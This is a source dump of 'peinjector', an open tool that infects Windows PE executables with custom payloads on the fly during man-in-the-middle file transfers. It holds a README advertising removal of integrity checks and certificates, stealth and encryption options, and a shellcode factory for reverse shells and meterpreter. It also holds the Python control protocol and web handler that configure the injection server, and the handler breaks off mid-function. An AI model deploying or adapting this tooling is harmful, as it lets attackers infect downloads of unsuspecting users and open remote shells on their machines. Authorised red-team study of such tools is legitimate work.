Project Path: arc_gmh5225_peinjector_wwjgjbaq

Source Tree:

```txt
arc_gmh5225_peinjector_wwjgjbaq
├── LICENSE
├── README.md
├── pe-injector-control
│   ├── LibPeProtocol.py
│   ├── ServerHandler.py
│   ├── ShellCodeBuilder.py
│   ├── cert_example_do_not_use_this.pem
│   ├── config.ini
│   ├── config_default.ini
│   ├── html
│   │   ├── about.htm
│   │   ├── css
│   │   │   ├── bootstrap-theme.min.css
│   │   │   ├── bootstrap.min.css
│   │   │   └── starter-template.css
│   │   ├── favicon.ico
│   │   ├── fonts
│   │   │   ├── glyphicons-halflings-regular.eot
│   │   │   ├── glyphicons-halflings-regular.svg
│   │   │   ├── glyphicons-halflings-regular.ttf
│   │   │   ├── glyphicons-halflings-regular.woff
│   │   │   └── glyphicons-halflings-regular.woff2
│   │   ├── images
│   │   │   ├── c.png
│   │   │   ├── java.png
│   │   │   └── python.png
│   │   ├── index.htm
│   │   ├── injector.htm
│   │   ├── js
│   │   │   ├── bootstrap.min.js
│   │   │   ├── getconfig.js
│   │   │   ├── injector.js
│   │   │   ├── jquery-2.1.3.min.js
│   │   │   └── shellcode.js
│   │   ├── music
│   │   │   ├── licensing.txt
│   │   │   ├── meric_skiff-resistor2_digital_native.mp3
│   │   │   ├── meric_skiff-resistor2_hhavok-intro.mp3
│   │   │   ├── meric_skiff-resistor2_jumpshot.mp3
│   │   │   └── meric_skiff-resistor_arpanauts.mp3
│   │   ├── settings.htm
│   │   └── shellcode.htm
│   ├── install
│   │   ├── peinjector-control_install.sh
│   │   ├── peinjector-control_service.sh
│   │   ├── peinjector-control_start.sh
│   │   └── peinjector-control_stop.sh
│   ├── peinjector_control.py
│   └── thirdparty
│       ├── WinIntelPE32.py
│       ├── WinIntelPE64.py
│       ├── __init__.py
│       └── calc_shellcode_license.txt
├── pe-injector-interceptor
│   ├── config.ini
│   ├── install
│   │   ├── peinjector-interceptor_dependencies.sh
│   │   ├── peinjector-interceptor_install.sh
│   │   ├── peinjector-interceptor_service.sh
│   │   ├── peinjector-interceptor_start.sh
│   │   └── peinjector-interceptor_stop.sh
│   ├── libPePatch.py
│   └── peinjector_interceptor.py
└── peinjector
    ├── 3rdparty
    │   └── ini
    │       ├── minGlue.h
    │       ├── minIni.c
    │       └── minIni.h
    ├── config.ini
    ├── connectors
    │   ├── c
    │   │   ├── libpepatch.c
    │   │   └── libpepatch.h
    │   ├── java
    │   │   └── eu
    │   │       └── peinjector
    │   │           ├── example
    │   │           │   └── EXAMPLE.java
    │   │           ├── gui
    │   │           │   └── jInjectorControlGUI.java
    │   │           └── libpe
    │   │               ├── LibPeControlProtocol.java
    │   │               ├── LibPeDataProtocol.java
    │   │               ├── LibPePatch.java
    │   │               ├── LibPeServerConfig.java
    │   │               ├── LibPeShellcodeFactory.java
    │   │               └── exceptions
    │   │                   ├── LibPeBadInputException.java
    │   │                   ├── LibPeException.java
    │   │                   ├── LibPeProtocolException.java
    │   │                   └── LibPeSocketException.java
    │   └── python
    │       └── libPePatch.py
    ├── def
    │   └── headers.h
    ├── install
    │   ├── peinjector_install.sh
    │   ├── peinjector_service.sh
    │   ├── peinjector_start.sh
    │   └── peinjector_stop.sh
    ├── libpefile.c
    ├── libpefile.h
    ├── libpeinfect.c
    ├── libpeinfect.h
    ├── libpeinfect_obfuscator.c
    ├── libpeinfect_obfuscator.h
    ├── libpeprotocol.c
    ├── libpeprotocol.h
    ├── libpeserver.c
    ├── libpeserver.h
    ├── libpetool.c
    ├── libpetool.h
    ├── peinjector.c
    ├── peinjector_make.bat
    └── peinjector_make.sh

```

`LICENSE`:

```
This is free and unencumbered software released into the public domain.

Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.

In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

For more information, please refer to <http://unlicense.org>


```

`README.md`:

```md
# peinjector

_Visit us at https://peinjector.eu/_

## Description
The executable file format on the Windows platform is PE COFF. The peinjector provides different ways to infect these files with custom payloads without changing the original functionality. It creates patches, which are then applied **seamlessly during file transfer**. It is very performant, lightweight, modular and can be **[operated on embedded hardware](https://github.com/JonDoNym/peinjector/wiki/Guide:-Raspberry-Pi-image)**.	

## Features
-	Full x86 and x64 PE file support.
-	Open Source
-	Fully working on Windows and Linux, including automated installation scripts.
-	Can be  operated on embedded hardware, tested on a [Rasperberry Pi 2](https://github.com/JonDoNym/peinjector/wiki/Guide:-Raspberry-Pi-image).
-	On Linux, all servers will be automatically integrated as service, no manual configuration required.
-	Plain C, no external libraries required (peinjector). 
-	MITM integration is available in C, Python and Java. A sample Python MITM implementation is included.
-	Foolproof, mobile-ready web interface. Anyone who can configure a home router can configure the injector server.
-	Easy to use integrated shellcode factory, including reverse shells, meterpreter, ... or own shellcode. Everything is available in 32 and 64 bit with optional automated encryption. Custom shellcode can be injected directly or as a new thread. 
-	An awesome about page and much more, check it out.

## Installation
[Installation Guide](https://github.com/JonDoNym/peinjector/wiki/Guide:-full-installation)

## Screenshots
[Screenshots](https://github.com/JonDoNym/peinjector/wiki/Screenshots)

## Contact the developers on
```
anon.zMisc@gmail.com
```

## peinjector
                                      + configuration                  
                                      | payload                        
                                      | ...                            
                          +-----------v------------+                   
          +-------+       |                        |                   
          | PATCH <-------+      libpeinfect       <--+                
          +-------+       |                        |  |                
                          +-----------+------------+  |                
                                      |               |                
                          +-----------v------------+  |                
                          |                        |  |                
          +--------------->       libpetool        |  |                
          | change values |                        |  |                
          | add sections  +-----------^------------+  |                
          | resize sect.              |               |                
          + ...                  +----v----+          |                
                                 | PEFILE  +----------+                
                                 +----^----+                           
                                      |                                
                          +-----------v------------+                   
          PE File data    |                        |    PE File data   
          +--------------->       libpefile        +--------------->   
                          |                        |                   
                          +------------------------+   


### libpefile
Provides PE file parsing, modification and reassembling capabilities, based on PE COFF specification. Also works with many non-compliant and deliberately malformed files which the Windows Loader accepts.

### libpetool
Provides more complex modifications (adding/resizing sections). Keeps header values PE COFF compliant.

### libpeinfect
Provides different infection methods, removes integrity checks, certificates, etc. It can fully infect a file (statically, e.g. from disk) or generate a patch (for MITM infection. Connectors which work with these patches are available in C, Python and Java). The infected file keeps its original functionality.

## servers
                                          +-----------------+-+
                                          |   web browser   |X|
                +-------------+           +-----------------+-+
                | peinjector- |           |       _____       |
        ------->+ interceptor +---------> |      /     \      |
        -orig.->+   (MITM)    +-patched-> |     | () () |     |
        -data-->+             +-data----> |      \  ^  /      |
        ------->+ +---------+ +---------> |       |||||       |
                | |connector| |           |                   |
                +-+-+-----^-+-+           +-----+------^------+
             raw    |     |              send   |      | get   
             header |     | patch        config |      | status
                    |     |                     |      |       
                +-+-v-----+-+-+           +-+---v------+---+-+ 
                | |data port| |           | |http(s) server| | 
                | +---------+ |           | +--------------+ | 
                | peinjector  |           |                  | 
                | (core   +---+ crtl      +---+ peinjector-  | 
                | engine) |c p| protocol  |c p| control      | 
                |         |r o+----------->r r| (user        | 
                |         |t r<-----------+t o| interface)   | 
                |         |l t|           |l .|              | 
                +---------+---+           +---+--------------+ 

### peinjector
Provides PE file patching as a service. Just send the raw header of your PE file and you’ll receive a custom-made patch for it. Can be remotely controlled via a command protocol.

### peinjector-control
Web interface to configure and control a peinjector server. A small shellcode factory with some basic shellcodes, automatic encryptoin/obfuscation and thread generation is provided - alternatively, custom shellcode can be injected.

### peinjector-interceptor
Sample MITM integration. Based on Python and libmproxy, supports SSL interception, can act as transparent Proxy, HTTP Proxy, ... . Provides seamless PE patching capabilities.

## related projects

[mitmproxy](https://mitmproxy.org/) - An interactive console program that allows traffic flows to be intercepted, inspected, modified and replayed. Written in Python 2.7. peinjector-interceptor is based on mitmproxy's libmproxy library. 

[BDFProxy](https://github.com/secretsquirrel/BDFProxy) - The idea for peinjector comes from this project. It can also do MITM executable modification, but doesn't provide seamless patching and isn't as performant as peinjector. It provides ELF and MACH-O infection, PE code cave jumping, IAT patching and more "static" patching methods.

```

`pe-injector-control/LibPeProtocol.py`:

```py
#!/usr/bin/env python3

# import lib
import socket
import struct

# communication: control <-> infection server
#
# 0         1                                5                                             n
# +----------------------------------------------------------------------------------------+
# |         |                                |                                             |
# | command |             length             |                    data                     |
# |         |                                |                                             |
# +----------------------------------------------------------------------------------------+
#
#     command: 1 Byte
#     length from data: 4 Byte
#     data: n Byte
#
class LibPeProtocol:

    # Receive Commands
    CMD_RECEIVE_SUCCESS                  = 0xFD
    CMD_RECEIVE_ERROR                    = 0xFE

    # Send Commands
    CMD_SEND_ECHO                                     = 0x01
    CMD_SEND_RESTART                                  = 0x02
    CMD_SEND_SET_SECTION_NAME                         = 0x03
    CMD_SEND_SET_METHOD_CHANGE_FLAGS                  = 0x04
    CMD_SEND_SET_METHOD_NEW_SECTION                   = 0x05
    CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE              = 0x06
    CMD_SEND_SET_METHOD_ALIGNMENT                     = 0x07
    CMD_SEND_SET_REMOVE_INTEGRITY_CHECK               = 0x08
    CMD_SEND_SET_DATA_PORT                            = 0x09
    CMD_SEND_SET_DATA_INTERFACE                       = 0x0A
    CMD_SEND_SET_CONTROL_PORT                         = 0x0B
    CMD_SEND_SET_CONTROL_INTERFACE                    = 0x0C
    CMD_SEND_SET_PAYLOAD_X86                          = 0x0D
    CMD_SEND_SET_PAYLOAD_X64                          = 0x0E
    CMD_SEND_GET_CONFIG                               = 0x0F
    CMD_SEND_SET_PAYLOAD_NAME_X86                     = 0x10
    CMD_SEND_SET_TRY_STAY_STEALTH                     = 0x11
    CMD_SEND_SET_ENABLE                               = 0x12
    CMD_SEND_SET_RANDOM_SECTION_NAME                  = 0x13
    CMD_SEND_SHUTDOWN                                 = 0x14
    CMD_SEND_SET_PAYLOAD_NAME_X64                     = 0x15
    CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP            = 0x16
    CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS = 0x17
    CMD_SEND_SET_ENCRYPT                              = 0x18
    CMD_SEND_SET_ENCRYPT_ITERATIONS                   = 0x19
    CMD_SEND_SET_TOKEN                                = 0x20

    # Command Type: Boolean (data = 1|0)
    CMD_SEND_PARAM_BOOL = [CMD_SEND_SET_METHOD_CHANGE_FLAGS,
                           CMD_SEND_SET_METHOD_NEW_SECTION,
                           CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE,
                           CMD_SEND_SET_METHOD_ALIGNMENT,
                           CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP,
                           CMD_SEND_SET_REMOVE_INTEGRITY_CHECK,
                           CMD_SEND_SET_DATA_INTERFACE,
                           CMD_SEND_SET_CONTROL_INTERFACE,
                           CMD_SEND_SET_RANDOM_SECTION_NAME,
                           CMD_SEND_SET_TRY_STAY_STEALTH,
                           CMD_SEND_SET_ENABLE,
                           CMD_SEND_SET_ENCRYPT]

    # Command Type: String (data = char-array)
    CMD_SEND_PARAM_STR = [CMD_SEND_SET_SECTION_NAME,
                          CMD_SEND_SET_PAYLOAD_NAME_X86,
                          CMD_SEND_SET_PAYLOAD_NAME_X64]

    # Command Type: Integer (data = int)
    CMD_SEND_PARAM_INT = [CMD_SEND_SET_DATA_PORT,
                          CMD_SEND_SET_CONTROL_PORT,
                          CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS,
                          CMD_SEND_SET_ENCRYPT_ITERATIONS]

    # Command Type: Byte (data = File)
    CMD_SEND_PARAM_BYTE = [CMD_SEND_SET_PAYLOAD_X86,
                           CMD_SEND_SET_PAYLOAD_X64,
                           CMD_SEND_SET_TOKEN]

    # Command Type: Void (no data; length=0)
    CMD_SEND_PARAM_VOID = [CMD_SEND_RESTART,
                           CMD_SEND_SHUTDOWN,
                           CMD_SEND_GET_CONFIG]

    # init
    def __init__(self, token: str, host: str, port: int, timeout: int=3, max_size: int=8192) -> object:
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_size = max_size
        self.last_error = None
        self.token = b'\xaa\xaa' + 30 * b'\x00'
        self.set_token(token)

    # Get last error description
    def get_last_error(self) -> str:
        return self.last_error

    # Set access token
    def set_token(self, token) -> bool:
        byte_token = bytes.fromhex(token)
        if (len(byte_token) != 32) or (byte_token[:2] != b'\xaa\xaa'):
          return False
        self.token = byte_token
        return True
      
    # Sends command, returns result
    #  return:   None ... error
    #            byte array ... OK (== CMD_RECEIVE_SUCCESS)
    def send_command(self, command, data):
        # Build Payload
        payload = self.token + bytes([command])
        if command in self.CMD_SEND_PARAM_BOOL:
            if type(data) is bool:
                payload += struct.pack("<I?", 1, data)
            else:
                self.last_error = "protocol error: boolean command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_STR:
            if type(data) is str:
                payload += struct.pack("<I", len(data)) + data.encode("ASCII")
            else:
                self.last_error = "protocol error: string command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_INT:
            if type(data) is int:
                payload += struct.pack("<II", 4, data)
            else:
                self.last_error = "protocol error: integer command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_BYTE:
            if type(data) is bytes:
                payload += struct.pack("<I", len(data)) + data
            else:
                self.last_error = "protocol error: byte command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_VOID:
            if data is None:
                payload += struct.pack("<I", 0)
            else:
                self.last_error = "protocol error: void command: wrong payload type"
                return None

        else:
            self.last_error = "protocol error: unknown command type"
            return None

        # Send command
        # If something goes wrong while network transmission
        try:
            # Open socket
            send_socket = socket.create_connection((self.host, self.port), self.timeout)
            # Send command to server
            if (send_socket is not None) and send_socket.send(payload):
                # Receive from Server
                mem = send_socket.recv(self.max_size)
                # Close socket
                send_socket.close()
                if mem is not None:
                    if len(mem) > 32:
                        if mem[:32] == self.token:
                            if mem[32] == self.CMD_RECEIVE_SUCCESS:
                                # jeeee, SUCCESS!!!!!!
                                return mem[37:] # return response (possibly an empty array)
                            else:
                                self.last_error = "protocol error: not received 'SUCCESS'"
                                return None
                        else:
                            self.last_error = "protocol error: invalid response token"
                            return None
                    else:
                        self.last_error = "protocol error: response to short"
                        return None
                else:
                    self.last_error = "protocol error: server is not responding"
                    return None
            else:
                self.last_error = "protocol error: no connection"
                return None

        except Exception:
            self.last_error = "protocol error: connection exception"
            return None

        # should never happen
        self.last_error = "protocol error: should never happen"
        return None

```

`pe-injector-control/ServerHandler.py`:

```py
#!/usr/bin/env python3

# import lib
from http.server import SimpleHTTPRequestHandler
import cgi
import configparser
import hashlib
import base64
import random
import ipaddress
import string
import os
# import file
from LibPeProtocol import LibPeProtocol
from ShellCodeBuilder import ShellCodeBuilder
from peinjector_control import CONFIG_FILE
from peinjector_control import CONFIG_SECTION_INJ
from peinjector_control import CONFIG_SECTION_WEB
from peinjector_control import CONFIG_KEY_IP
from peinjector_control import CONFIG_KEY_PORT
from peinjector_control import CONFIG_KEY_AUTH
from peinjector_control import CONFIG_KEY_PASSHASH
from peinjector_control import CONFIG_KEY_TOKEN


class SimplePostHTTPRequestHandler(SimpleHTTPRequestHandler):

    # generate hash: sha256( sha256(salt) + sha256(base64_basic_auth) )
    def generatePassHash(self, config_salt, base64_basic_auth):
        # prepare user input
        if 'Basic' in base64_basic_auth:
            base64_basic_auth = base64_basic_auth[6:] # remove 'Basic ' from string like: 'Basic o27435n7o2qo7=='
        # hash, hash, hash, ...
        salt_hash = hashlib.sha256(config_salt.encode("Ascii"))                  # sha256(salt)
        salt_hash = salt_hash.hexdigest()                                        #    convert to hexString
        basic_auth_hash = hashlib.sha256(base64_basic_auth.encode("Ascii"))      # sha256(base64_basic_auth)
        basic_auth_hash = basic_auth_hash.hexdigest()                            #    convert to hexString
        final_hash = hashlib.sha256((salt_hash+basic_auth_hash).encode("Ascii")) # sha256( sha256(salt) + sha256(base64_basic_auth) )
        final_hash = final_hash.hexdigest()                                      #    convert byte to hexString
        return final_hash

    # set user hash
    def setPassHash(self, username, password):
        # create base64_basic_auth String
        base64_basic_auth = base64.b64encode((username +':'+ password).encode("Ascii")) # base64(USER:PASS)
        base64_basic_auth = base64_basic_auth.decode("UTF-8")                           #    convert to String
        # generate salt
        salt = str(random.getrandbits(256))                                             # random string
        salt = hashlib.sha256(salt.encode("Ascii")).hexdigest()                         #    hash the string
        # use generatePassHash()
        final_hash = self.generatePassHash(config_salt=salt, base64_basic_auth=base64_basic_auth)
        # write to config
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        config.set(CONFIG_SECTION_WEB, CONFIG_KEY_PASSHASH, salt+':'+final_hash)
        with open(CONFIG_FILE, 'w') as configfile:
            config.write(configfile)

    # catch GET requests and redirected to the super class (after base_authenticate)
    def do_GET(self):
        if self.base_authenticate():
            self.path = "/html" + self.path         # set DocumentRoot to /html
            SimpleHTTPRequestHandler.do_GET(self)

    # catch POST requests and redirected to post_api() (after base_authenticate)
    def do_POST(self):
        if self.base_authenticate():
            # get vars
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD':'POST','CONTENT_TYPE':self.headers['Content-Type'],})
            post_key = form.getfirst('key',None)
            post_value = form.getfirst('value',"")
            post_shellselect = form.getfirst('shellselect',None)

            # select API
            if(post_key is not None and post_value is not None):
                # 'key' and 'value' must exist
                self.post_api_keyvalue(key=post_key, value=post_value)
            elif(post_shellselect is not None):
                # 'shellselect' exist
                post_name = form.getfirst('name',"")
                post_host = form.getfirst('host',None)
                post_port = form.getfirst('port',None)
                post_xor = form.getfirst('xor',None)
                post_textarea = form.getfirst('textarea',None)
                post_system = form.getfirst('system',None)
                self.post_api_shellcode(shellselect=post_shellselect, system=post_system, name=post_name, shellhost=post_host, shellport=post_port, xor=post_xor, textarea=post_textarea)
            else:
                # no API found
                print("post request error: no api selected")
                self.wfile.write(b"post request error: no api selected")

    # check user and pass and return TRUE
    def base_authenticate(self):
        # read config
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        config_auth_enable = False
        config_salt = "None"
        config_hash = "None"
        if CONFIG_SECTION_WEB in config:
            config_auth_enable = config[CONFIG_SECTION_WEB].getboolean(CONFIG_KEY_AUTH, fallback=False)
            conf_salt_pass_hash = config[CONFIG_SECTION_WEB].get(CONFIG_KEY_PASSHASH, fallback="None:None")
            if ':' in conf_salt_pass_hash:
                config_salt = conf_salt_pass_hash.split(':')[0]
                config_hash = conf_salt_pass_hash.split(':')[1]

        # do your thing
        if not config_auth_enable:
            # authentication disabled
            return True
        elif self.headers.get('Authorization') == None:
            # send Header
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm=\"peinjector-control\"')
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            # send body
            self.wfile.write(b"no auth header received")
            self.wfile.flush()
            return False
        else:
            # check hash
            user_hash = self.generatePassHash(config_salt, self.headers.get('Authorization'))
            if config_hash == user_hash:
                # authentication success
                return True
            else:
                # send Header
                self.send_response(401)
                self.send_header('WWW-Authenticate', 'Basic realm=\"peinjector-control\"')
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                # send body
                self.wfile.write(b"not authenticated")
                self.wfile.flush()
                return False

    # send a command
    def simply_command_send(self, command, data, host, port, token):
        # connect
        con = LibPeProtocol(token=token, host=host, port=port)
        con.send_command(command=command, data=data)
        last_error = con.get_last_error()
        # result
        if last_error is not None:
            # ERROR
            print(last_error)
            self.wfile.write(last_error.encode("Ascii"))  # send the error and the GUI will display it
            return False
        else:
            # OK
            self.wfile.write(b"OK") # send "OK" and the GUI will not do anything
            return True

    # POST handling (API 1)
    def post_api_keyvalue(self, key, value):

        # read injector ip and port from config
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        token="AAAA000000000000000000000000000000"
        host="127.0.0.1"
        port=31338
        if CONFIG_SECTION_INJ in config:
            token = config[CONFIG_SECTION_INJ].get(CONFIG_KEY_TOKEN, fallback=token)
            host = config[CONFIG_SECTION_INJ].get(CONFIG_KEY_IP, fallback=host)
            port = int(config[CONFIG_SECTION_INJ].get(CONFIG_KEY_PORT, fallback=port))
        else:
            config.add_section(CONFIG_SECTION_INJ)  # importend for 'controlport' and 'controlip'

        # send header
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()

        # send body
        print("post request: set", key, "to", value)
        # ---------------------------------------------------
        if("injrestart" == key):
            # restart is a void command (value=None)
            value = None
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_RESTART, data=value, host=host, port=port, token=token)

        elif("sectionname" == key):
            # set STRING
            value = value # 'value' is already a string
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_SECTION_NAME, data=value, host=host, port=port, token=token)

        elif("changeflags" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_METHOD_CHANGE_FLAGS, data=value, host=host, port=port, token=token)

        elif("newsection" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_METHOD_NEW_SECTION, data=value, host=host, port=port, token=token)

        elif("alignmentresize" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE, data=value, host=host, port=port, token=token)

        elif("alignment" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_METHOD_ALIGNMENT, data=value, host=host, port=port, token=token)

        elif("crosssectionjump" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP, data=value, host=host, port=port, token=token)

        elif("removeintegity" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_REMOVE_INTEGRITY_CHECK, data=value, host=host, port=port, token=token)

        elif("dataport" == key):
            # cast value to int
            value = int(value)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_DATA_PORT, data=value, host=host, port=port, token=token)

        elif("encryptiterations" == key):
            # cast value to int
            value = int(value)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_ENCRYPT_ITERATIONS, data=value, host=host, port=port, token=token)

        elif("crosssectionjumpiterations" == key):
            # cast value to int
            value = int(value)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS, data=value, host=host, port=port, token=token)

        elif("token" == key):
            # cast value to byte
            try:
                he3x = bytes.fromhex(value)
            except Exception:
                he3x = None
            # simply command send
            isok = self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_TOKEN, data=he3x, host=host, port=port, token=token)
            # save local
            if(isok):
                # write token in local config
                config.set(CONFIG_SECTION_INJ, CONFIG_KEY_TOKEN, value)
                with open(CONFIG_FILE, 'w') as configfile:
                    config.write(configfile)

        elif("token_write" == key):
            try:
                # test for hex
                bytes.fromhex(value)
                # write token in local config
                config.set(CONFIG_SECTION_INJ, CONFIG_KEY_TOKEN, value)
                with open(CONFIG_FILE, 'w') as configfile:
                    config.write(configfile)
                # return OK
                self.wfile.write(b"OK")
            except Exception:
                self.wfile.write(b"post request error: invalid hex")

        elif("datainterface" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_DATA_INTERFACE, data=value, host=host, port=port, token=token)

        elif("controlport" == key):
            # cast value to int
            port_new = int(value)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_CONTROL_PORT, data=port_new, host=host, port=port, token=token)

        elif("controlport_write" == key):
            # cast value to int
            port_new = int(value)
            # write port in local config
            config.set(CONFIG_SECTION_INJ, CONFIG_KEY_PORT, str(port_new))
            with open(CONFIG_FILE, 'w') as configfile:
                config.write(configfile)
            # return OK
            self.wfile.write(b"OK")

        elif("controlip" == key):
            # validate
            if len(value) <= 255:
                # write ip in local config
                config.set(CONFIG_SECTION_INJ, CONFIG_KEY_IP, value)
                with open(CONFIG_FILE, 'w') as configfile:
                    config.write(configfile)
                # return OK
                self.wfile.write(b"OK")
            else:
                self.wfile.write(b"post request error: invalid ip or hostname address")

        elif("controlinterface" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_CONTROL_INTERFACE, data=value, host=host, port=port, token=token)

        elif("enableencrypt" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_ENCRYPT, data=value, host=host, port=port, token=token)

        elif("randomsectionname" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_RANDOM_SECTION_NAME, data=value, host=host, port=port, token=token)

        elif("trystaystealth" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_TRY_STAY_STEALTH, data=value, host=host, port=port, token=token)

        elif("enable" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # simply command send
            self.simply_command_send(command=LibPeProtocol.CMD_SEND_SET_ENABLE, data=value, host=host, port=port, token=token)

        elif("adminpass" == key):
            # set STRING
            value = value # 'value' is already a string
            # set admin password
            self.setPassHash('admin', value)
            # return OK
            self.wfile.write(b"OK")

        elif("enableauth" == key):
            # cast value to boolean
            value = (True if (value == "true") else False)
            # write config
            config.set(CONFIG_SECTION_WEB, CONFIG_KEY_AUTH, str(value))
            with open(CONFIG_FILE, 'w') as configfile:
                config.write(configfile)
            # return OK
            self.wfile.write(b"OK")

        elif("getconfig" == key):
            # return web-ini
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            for section in config.sections():
                for key in config[section]:
                    writestr = section+'_'+key+"{|~|}"+config[section][key]+'\n'
                    if not key == CONFIG_KEY_PASSHASH:
                        # alles ausser PASSHASH ausgeben
                        self.wfile.write(writestr.encode("Ascii"))
            # get config is a void command (value=None)
            value = None
            # send command
            con = LibPeProtocol(token=token, host=host, port=port)
            result = con.send_command(command=LibPeProtocol.CMD_SEND_GET_CONFIG, data=value)
            last_error = con.get_last_error()
            # result
            if last_error is not None:
                # ERROR
                print(last_error)
                last_error = 'ERROR: '+last_error
                self.wfile.write(last_error.encode("Ascii"))  # send the error and the GUI will display it
            else:
                # OK:  return server-ini
                config = configparser.ConfigParser()
                config.read_string(result.decode("UTF-8"))
                for section in config.sections():
                    for key in config[section]:
                        writestr = section+'_'+key+"{|~|}"+config[section][key]+'\n'
                        self.wfile.write(writestr.encode("Ascii"))

        elif("exportconfig" == key):
            # get config is a void command (value=None)
            value = None
            # send command
            con = LibPeProtocol(token=token, host=host, port=port)
            result = con.send_command(command=LibPeProtocol.CMD_SEND_GET_CONFIG, data=value)
            last_error = con.get_last_error()
            # result
            if last_error is not None:
                # ERROR
                print(last_error)
                last_error = 'ERROR: '+last_error
                self.wfile.write(last_error.encode("Ascii"))  # send the error and the GUI will display it
            else:
                # OK:  return server-ini
                self.wfile.write(result)

        # bad command
        else:
            self.wfile.write(b"post request error: command not found")
        # ---------------------------------------------------
        self.wfile.flush()

    # POST handling (API 2)
    def post_api_shellcode(self, shellselect, system, name, shellhost, shellport, xor, textarea=None):
        print("post request: shellchode:", shellselect, "system:", system, "name:", name, "host:", shellhost, "port:", shellport, "xor:", xor, "textarea:", textarea)

        # read injector ip and port from config
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        token="AAAA000000000000000000000000000000"
        injhost="127.0.0.1"
        injport=31338
        if CONFIG_SECTION_INJ in config:
            token = config[CONFIG_SECTION_INJ].get(CONFIG_KEY_TOKEN, fallback=token)
            injhost = config[CONFIG_SECTION_INJ].get(CONFIG_KEY_IP, fallback=injhost)
            injport = int(config[CONFIG_SECTION_INJ].get(CONFIG_KEY_PORT, fallback=injport))
        else:
            config.add_section(CONFIG_SECTION_INJ)  # importend for 'controlport' and 'controlip'

        # send header
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()

        # clear name
        valid_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
        name = ''.join(c for c in name if c in valid_chars)

        # clear textarea
        if textarea is not None:
            textarea = textarea.replace(' ','').replace(':','').replace('-','').replace('.','')

        # check user input
        if shellport is None or not shellport.isdigit():
            print("post request error: port must be a number")
            self.wfile.write(b"port must be a number")
        elif not self.is_valide_ip(shellhost):
            print("post request error: host must be a ip")
            self.wfile.write(b"host must be a ip")
        else:
            # convert shellcode (textarea) from HEX-String to Bytes
            try:
                textarea = bytes.fromhex(textarea)
            except Exception:
                textarea = None
                print("no valid textarea")
            # ShellCodeBuilder
            scb = ShellCodeBuilder()
